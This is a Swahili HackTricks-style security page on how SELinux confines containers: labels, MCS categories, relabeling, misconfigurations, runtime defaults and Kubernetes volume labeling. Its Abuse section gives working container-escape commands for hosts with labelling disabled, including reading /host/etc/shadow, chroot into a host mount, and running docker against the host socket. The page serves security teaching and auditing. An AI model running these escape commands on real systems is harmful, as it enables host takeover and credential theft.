# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

SELinux ni mfumo wa **Mandatory Access Control unaotegemea labels**. Kila process na object husika inaweza kuwa na security context, na policy huamua ni domains zipi zinaweza kuingiliana na types zipi na kwa njia gani. Katika mazingira ya containerized, hii kwa kawaida humaanisha kuwa runtime huanzisha container process chini ya container domain iliyowekewa mipaka na huweka labels kwenye container content kwa types zinazolingana. Ikiwa policy inafanya kazi ipasavyo, process inaweza kusoma na kuandika vitu ambavyo label yake inatarajiwa kugusa, huku ikizuiwa kufikia content nyingine ya host, hata kama content hiyo itaonekana kupitia mount.

Hii ni mojawapo ya protections zenye nguvu zaidi upande wa host zinazopatikana katika mainstream Linux container deployments. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na ecosystems nyingine zinazotegemea SELinux. Katika mazingira hayo, reviewer anayepuuza SELinux mara nyingi hataelewa kwa nini njia inayoonekana wazi ya ku-compromise host imezuiwa.

## AppArmor Dhidi ya SELinux

Tofauti rahisi zaidi ya kiwango cha juu ni kwamba AppArmor inategemea paths, huku SELinux ikiwa **inategemea labels**. Hilo lina athari kubwa kwa container security. Policy inayotegemea paths inaweza kufanya kazi kwa njia tofauti ikiwa content ileile ya host itaonekana chini ya mount path isiyotarajiwa. Policy inayotegemea labels badala yake huuliza object ina label gani na process domain inaweza kufanya nini kwake. Hii haifanyi SELinux kuwa rahisi, lakini huifanya iwe imara dhidi ya aina fulani ya assumptions za path-trick ambazo defenders wakati mwingine hufanya kimakosa kwenye systems zinazotegemea AppArmor.

Kwa sababu model hii inaelekezwa na labels, container volume handling na maamuzi ya relabeling ni muhimu kwa security. Ikiwa runtime au operator atabadilisha labels kwa upana kupita kiasi ili "kufanya mounts zifanye kazi", policy boundary iliyokusudiwa ku-contain workload inaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.

## Lab

Ili kuona kama SELinux iko active kwenye host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Ili kukagua labels zilizopo kwenye host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Ili kulinganisha uendeshaji wa kawaida na ule ambao labeling imezimwa:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Kwenye host iliyowezeshwa SELinux, huu ni mfano wa vitendo sana kwa sababu unaonyesha tofauti kati ya workload inayotumia container domain inayotarajiwa na ile ambayo imeondolewa layer hiyo ya enforcement.

## Matumizi ya Runtime

Podman inalingana vizuri hasa na SELinux kwenye mifumo ambayo SELinux ni sehemu ya default ya platform. Rootless Podman pamoja na SELinux ni mojawapo ya misingi imara zaidi ya kawaida ya containers kwa sababu mchakato tayari hauna privileges upande wa host na bado umewekewa mipaka na sera ya MAC. Docker pia inaweza kutumia SELinux pale inapoungwa mkono, ingawa administrators wakati mwingine huizima ili kukabiliana na matatizo ya volume-labeling. CRI-O na OpenShift hutegemea sana SELinux kama sehemu ya mfumo wao wa container isolation. Kubernetes pia inaweza kutoa settings zinazohusiana na SELinux, lakini thamani yake kwa wazi inategemea ikiwa OS ya node kwa hakika inaunga mkono na kutekeleza SELinux.<sup>[[2]](#references)</sup>

Somo linalojirudia ni kwamba SELinux si mapambo ya hiari. Katika ecosystems zilizojengwa kuizunguka, ni sehemu ya security boundary inayotarajiwa. Kwa host-side policy enumeration, transition analysis, na matumizi mabaya ya zana za usimamizi wa SELinux, angalia [ukurasa wa jumla wa SELinux](../../../interesting-files-permissions/selinux.md).

## MCS Categories na Volume Relabeling

Container isolation kwa kawaida ni mchanganyiko wa **type enforcement** na **Multi-Category Security (MCS)**. Processes mbili zinaweza zote kuendesha kama `container_t`, lakini zikipokea levels tofauti kama `s0:c123,c456` na `s0:c321,c654`. Maudhui binafsi ya container hupewa label `container_file_t` yenye categories zinazolingana, kwa hiyo kufikia tu path ya container nyingine haitoshi kuipata. Runtimes kwa kawaida hugawa category pair; kutumia tena level kwa makusudi huondoa utenganishaji huu wa kila container.<sup>[[3]](#references)</sup>

Linganisha process labels na mount labels badala ya kuangalia type pekee:<sup>[[3]](#references)</sup>
```bash
podman inspect --format 'process={{.ProcessLabel}} mount={{.MountLabel}}' <container>
podman top <container> label
ps -eZ | grep -E 'container_t|spc_t'
ls -Zd /path/to/bind-mount
```
Viambishi tamati vya Bind-mount hubadilisha lebo za host inode na hivyo kubadilisha mpaka wa usalama, si metadata ya mount pekee:<sup>[[3]](#references)</sup>

- `:Z` hutumia lebo ya kibinafsi yenye kategoria za MCS za container. Inafaa kwa volume inayomilikiwa na container au Pod moja.
- `:z` hutumia lebo ya pamoja ili containers nyingine zilizowekewa ulinzi ziweze pia kutumia maudhui (kwa kuzingatia ruhusa za DAC). Kuitumia kwa secrets au data mahususi ya tenant huondoa MCS isolation ambayo vinginevyo ingetenganisha containers.
- Relabeling ni ya kujirudia. Kutumia chaguo lolote kati ya haya kwenye miti mipana ya host kama vile `/`, `/etc`, `/usr`, au mti mzima wa home kunaweza kuonyesha maudhui kwa container iliyochaguliwa na pia kusimamisha huduma za host ambazo lebo zake zilizotarajiwa zimebadilishwa.

Kutumia tena level ya manual ni rahisi kutambua kwenye command lines na manifests. Containers mbili zifuatazo hupewa kwa makusudi MCS level ileile na kwa hivyo zinaweza kutumia maudhui yaliyowekewa lebo ya level hiyo:<sup>[[3]](#references)</sup>
```bash
podman run --security-opt label=level:s0:c100,c200 ...
podman run --security-opt label=level:s0:c100,c200 ...
```
Pia tofautisha `label=nested` na `label=disable`: ya kwanza hufichua SELinux operations ndani ya container na inaruhusu mabadiliko ya label pale tu ambapo policy inaruhusu, ilhali ya pili huondoa utenganishaji wa label kwa workload hiyo. Zote zinastahili kuchunguzwa, lakini hazilingani.<sup>[[3]](#references)</sup>

## Misconfigurations

Kosa la kawaida ni `label=disable`. Kwa upande wa uendeshaji, mara nyingi hili hutokea kwa sababu volume mount ilikataliwa, na jibu la haraka la muda mfupi lilikuwa kuiondoa SELinux kwenye mlinganyo badala ya kurekebisha modeli ya labeling.<sup>[[1]](#references)</sup> Kosa lingine la kawaida ni relabeling isiyo sahihi ya maudhui ya host. Broad relabel operations zinaweza kufanya application ifanye kazi, lakini pia zinaweza kupanua kile ambacho container inaruhusiwa kugusa zaidi ya ilivyokusudiwa mwanzoni.

Pia ni muhimu kutotatanisha SELinux **installed** na SELinux **effective**. Host inaweza kuunga mkono SELinux na bado iwe katika permissive mode, au runtime inaweza kuwa haizindui workload chini ya domain inayotarajiwa. Katika hali hizo, ulinzi huwa dhaifu zaidi kuliko documentation inavyoweza kupendekeza.

## Abuse

SELinux inapokosekana, ikiwa katika permissive mode, au ikiwa imezimwa kwa upana kwa workload, paths zilizomountiwa kutoka kwa host huwa rahisi zaidi kutumiwa vibaya. Bind mount ileile ambayo kwa kawaida ingezuiwa na labels inaweza kuwa njia ya moja kwa moja ya kufikia data ya host au kufanya mabadiliko kwenye host. Hili ni muhimu hasa linapochanganywa na writable volume mounts, container runtime directories, au operational shortcuts zilizofichua host paths nyeti kwa ajili ya urahisi.

SELinux mara nyingi hueleza kwa nini generic breakout writeup inafanya kazi mara moja kwenye host moja lakini inashindwa mara kwa mara kwenye nyingine, ingawa runtime flags zinaonekana kufanana. Kiungo kinachokosekana mara nyingi si namespace wala capability, bali ni label boundary iliyobaki salama.

Ukaguzi wa haraka zaidi wa vitendo ni kulinganisha active context, kisha kuchunguza mounted host paths au runtime directories ambazo kwa kawaida zingezuiwa na labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ikiwa host bind mount ipo na SELinux labeling imezimwa au kudhoofishwa, kufichuliwa kwa taarifa mara nyingi huwa jambo la kwanza:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ikiwa mount inaweza kuandikwa na container kwa mtazamo wa kernel iko sawa na root wa host, hatua inayofuata ni kujaribu marekebisho yaliyodhibitiwa ya host badala ya kubashiri:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Kwenye hosts zenye uwezo wa SELinux, kupoteza labels katika directories za runtime state kunaweza pia kufichua njia za moja kwa moja za privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Amri hizi hazibadilishi chain kamili ya escape, lakini zinaonyesha haraka sana ikiwa SELinux ndiyo iliyokuwa ikizuia ufikiaji wa data ya host au urekebishaji wa faili upande wa host.

### Mfano Kamili: SELinux Imezimwa + Mount ya Host Inayoweza Kuandikwa

Ikiwa SELinux labeling imezimwa na filesystem ya host imewekwa ikiwa inaweza kuandikwa kwenye `/host`, host escape kamili huwa kesi ya kawaida ya bind-mount abuse:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa `chroot` itafanikiwa, mchakato wa container sasa unafanya kazi kutoka kwenye filesystem ya host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Mfano Kamili: SELinux Imezimwa + Runtime Directory

Ikiwa workload inaweza kufikia runtime socket baada ya labels kuzimwa, escape inaweza kukabidhiwa kwa runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Uchunguzi muhimu ni kwamba SELinux mara nyingi ilikuwa udhibiti uliokuwa ukizuia hasa aina hii ya ufikiaji wa host-path au hali ya runtime.

## Ukaguzi

Lengo la ukaguzi wa SELinux ni kuthibitisha kuwa SELinux imewezeshwa, kutambua security context ya sasa, na kuona ikiwa faili au paths unazohitaji kwa kweli zimewekewa mipaka na labels.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Kinachovutia hapa:

- `getenforce` inapaswa kwa kawaida kurudisha `Enforcing`; `Permissive` au `Disabled` hubadilisha maana ya sehemu nzima ya SELinux.
- Ikiwa muktadha wa mchakato wa sasa unaonekana usiotarajiwa au mpana kupita kiasi, workload huenda haiendeshwi chini ya container policy iliyokusudiwa.
- Ikiwa faili zilizowekwa kutoka host au runtime directories zina labels ambazo mchakato unaweza kuzifikia kwa uhuru kupita kiasi, bind mounts huwa hatari zaidi.

Unapokagua container kwenye platform inayoweza kutumia SELinux, usichukulie labeling kama jambo la ziada. Mara nyingi ni mojawapo ya sababu kuu zinazofanya host isiwe tayari compromised.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Hutegemea host | SELinux separation inapatikana kwenye hosts zilizo na SELinux, lakini tabia halisi hutegemea usanidi wa host/daemon | `--security-opt label=disable`, broad relabeling ya bind mounts, `--privileged` |
| Podman | Kwa kawaida imewezeshwa kwenye SELinux hosts | SELinux separation ni sehemu ya kawaida ya Podman kwenye SELinux systems isipokuwa imezimwa | `--security-opt label=disable`, `label=false` katika `containers.conf`, `--privileged` |
| Kubernetes | Runtime-assigned kwenye SELinux nodes; inaweza kusanidiwa explicitly | Runtime inaweza kutenga label ya kipekee wakati Pod haijaweka moja. `securityContext.seLinuxOptions` iliyowekwa explicitly hudhibiti Pod/volume label; kwenye Kubernetes 1.37, volumes zinazostahiki hutumia SELinux mount labeling kwa default | MCS levels zilizorudiwa, nodes za permissive/disabled, privileged workloads pana, `seLinuxChangePolicy: Recursive` kutumiwa bila ubaguzi <sup>[[2]](#references)[[4]](#references)</sup> |
| CRI-O / OpenShift style deployments | Kwa kawaida hutegemewa sana | SELinux mara nyingi ni sehemu ya msingi ya node isolation model katika mazingira haya | custom policies zinazopanua access kupita kiasi, kuzima labeling kwa ajili ya compatibility |

SELinux defaults hutegemea distribution zaidi kuliko seccomp defaults. Kwenye systems za mtindo wa Fedora/RHEL/OpenShift, SELinux mara nyingi ni sehemu kuu ya isolation model. Kwenye systems zisizo na SELinux, haipo kabisa.

## Kubernetes 1.37 Volume Labeling

Kubernetes 1.37 ilifanya `SELinuxMount` kuwa stable na kuiwezesha kwa default. Kwa PVC inayostahiki, Pod yenye `seLinuxOptions`, na CSI driver inayotangaza `.spec.seLinuxMount: true`, kubelet hutumia `-o context=<label>` badala ya kuomba runtime ifanye recursive relabeling ya kila inode. Drivers na volume types zisizotumika bado hutumia recursive path. Hii huepuka relabel walk kubwa na pia huepuka kubadilisha persistent labels za kila faili kwa ajili tu ya kuifanya volume ipatikane kwa Pod.<sup>[[2]](#references)[[4]](#references)</sup>

Mount inaweza kuwa na context moja tu ya aina hiyo. Kwa hiyo, Pods zenye **SELinux labels tofauti** zinazotumia volume ileile inayostahiki kwenye node ileile haziwezi tena kuwepo pamoja chini ya default `MountOption` behavior: moja hubaki katika `ContainerCreating` ikiwa na kosa la `conflicting SELinux labels of volume`. Chukulia hili kama tatizo la availability na pia ishara muhimu kwamba workloads zilikuwa zikishiriki storage kwa njia isiyo dhahiri kwenye mipaka ya MCS. Ikiwa kushirikiana huko kumekusudiwa—kwa mfano, `spc_t` Pod yenye privileged access na Pod iliyozuiwa zinazotumia volume ileile—njia ya compatibility escape hatch kwa kila Pod ni `seLinuxChangePolicy: Recursive`; usiitumie cluster-wide bila kuelewa ni paths zipi runtime itazirelabel.<sup>[[2]](#references)[[4]](#references)</sup>
```yaml
spec:
securityContext:
seLinuxOptions:
level: "s0:c123,c456"
seLinuxChangePolicy: Recursive
```
Ukaguzi muhimu wa upande wa cluster:<sup>[[2]](#references)</sup>
```bash
# Drivers that opt in to -o context= volume mounts
kubectl get csidriver -o custom-columns=NAME:.metadata.name,SELINUX_MOUNT:.spec.seLinuxMount

# Explicit levels or recursive-policy exceptions
kubectl get pods -A -o json | jq -r '
.items[] |
select(.spec.securityContext.seLinuxOptions or
.spec.securityContext.seLinuxChangePolicy) |
[.metadata.namespace,.metadata.name,
(.spec.securityContext.seLinuxOptions.level // "-"),
(.spec.securityContext.seLinuxChangePolicy // "MountOption")] | @tsv'

# Start failures and warnings caused by incompatible labels
kubectl get events -A --sort-by=.lastTimestamp |
grep -Ei 'SELinux|conflicting SELinux labels'
```
Kidhibiti cha hiari cha kube-controller-manager `selinux-warning-controller` hutambua Pods zinazoshiriki volume yenye labels zisizooana na huweka wazi metric ya `selinux_warning_controller_selinux_volume_conflict`. Kiwashe na ukikague kabla ya upgrades au kabla ya kubadilisha tabia ya volume-label; husaidia kutofautisha mgongano halisi wa policy na hitilafu ya kawaida ya CSI au filesystem.<sup>[[2]](#references)</sup>

## References

- [1] [Nyaraka za Podman: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Kusanidi Security Context kwa Pod au Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [3] [Nyaraka za podman run: SELinux labels na volume relabeling](https://docs.podman.io/en/latest/markdown/podman-run.1.html)
- [4] [Kubernetes v1.37 release: SELinuxMount na SELinuxChangePolicy](https://kubernetes.io/blog/2026/08/26/kubernetes-v1-37-release/)
{{#include ../../../../banners/hacktricks-training.md}}
